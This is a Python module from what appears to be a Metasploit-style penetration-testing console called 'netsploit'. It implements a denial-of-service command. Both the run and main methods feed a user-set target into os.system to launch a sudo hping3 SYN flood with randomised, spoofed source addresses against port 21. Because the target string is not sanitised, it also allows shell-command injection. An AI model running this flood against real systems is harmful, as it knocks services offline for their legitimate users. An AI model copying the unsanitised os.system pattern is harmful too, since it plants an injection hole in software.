""" Denial-of-Service Module
- Module that sends a succession of SYN requests to the target system 
  to make the system unresponsive to legitimate traffic
"""

# Import required modules and libraries
import os

from simple_colors import cyan, yellow
from tabulate import tabulate

# from utils import (DB, custom_prompt, error_message, exit_program,
#                    info_message, success_message)
from utils.config import DB
from utils.exit_program import exit_program
from utils.font_styles import error_message, info_message, success_message


class DoS:
    """DoS class with: __init__() method providing module metadata,
    run() method method to be called in the Auto module, and
    main() method which is the whole module with all its functions"""

    def __init__(self):
        self.name = "dos"
        self.description = "Denial-of-Service attack"
        self.options = "TARGET"

    def run(self, target=None):
        """
        `target` parameter is the IP address of the target device for which the scan will be run on
        """
        # target = DB.get("TARGET")
        if target is False:
            error_message(
                "Cannot run DoS attack without TARGET being specified. Please specify the TARGET and try again"
            )
            # dos()
        else:
            info_message(
                f"Running DoS attack on {target}, this may take up to two minutes"
            )  # noqa
            info_message(
                "Running a DoS attack properly requires the command to be run using sudo"
            )  # noqa
            print()
            os.system(
                f"sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source {target}"
            )  # noqa
            print()
            success_message(f"Finished attacking {target}")
            # dos()
        # dos()

    def main(self):
        """Function which includes module prompt with all in-module commands"""
        from utils.prompt import custom_prompt, prompt

        # prompt_input = input(
        #     f'{yellow("netsploit", "underlined")} => {blue("(dos)", "bold")} {green(">")} '
        # )  # noqa
        prompt_input = custom_prompt("dos")
        prompt_input = prompt_input.lower()

        if prompt_input == "show options":
            value = "(not set)" if DB.get("TARGET") is False else DB.get("TARGET")
            # Table for displaying options and other info
            table = [["OPTIONS", "VALUE", "OPTIONAL?"], ["TARGET", value, "no"]]  # noqa
            # Print the table (on to the console, of course)
            print(tabulate(table, headers="firstrow", tablefmt="fancy_grid"))
            # dos()
            self.main()

        elif prompt_input.startswith("target =>") or prompt_input.startswith(
            "set target"
        ):  # noqa
            # split prompt_input from string to array
            option_args = prompt_input.split()
            # option is the second index (3rd string) in array
            option = option_args[2]
            # Set IP range to given option
            DB.set("TARGET", option)
            # Display success message like this: "IP_RANGE set to 192.168.0.1"
            success_message(f'TARGET set to "{DB.get("TARGET")}"')
            # dos()
            self.main()

        elif prompt_input == "run":
            target = DB.get("TARGET")
            if target is False:
                error_message(
                    "Cannot run DoS attack without TARGET being specified. Please specify the TARGET and try again"
                )  # noqa
                # dos()
            else:
                info_message(
                    f"Running DoS attack on {target}, this may take up to two minutes"
                )  # noqa
                info_message(
                    "Running a DoS attack properly requires the command to be run using sudo"
                )  # noqa
                print()
                os.system(
                    f"sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source {target}"
                )  # noqa
                print()
                success_message(f"Finished attacking {target}")
                # dos()
                self.main()
            # dos()
            self.main()

        elif prompt_input == "exit":
            exit_program()

        elif prompt_input == "back":
            prompt()

        elif prompt_input == "":
            # dos()
            self.main()

        elif prompt_input == "help":
            print()
            print(f'{cyan("Help for dos:", ["bold", "underlined"])}')
            print()
            print(
                f'[{yellow("Optional", "italic")}] See options that you can set using {yellow("show options", "bold")}'
            )  # noqa
            print(
                f'1. Set the target using {yellow("set TARGET 123.456.789", "bold")} or {yellow("TARGET => 123.456.789", "bold")} (make sure to replace 123.456.789 with the IP of your target!)'
            )  # noqa
            print(f'2. Run your scan using {yellow("run", "bold")}')
            print()
            # dos()
            self.main()

        elif prompt_input == "clear":
            os.system("clear")
            # dos()
            self.main()

        else:
            invalid_command = prompt_input.split()[0]
            error_message(
                f'Invalid command "{invalid_command}". Please enter a valid command'
            )  # noqa
            # dos()
            self.main()
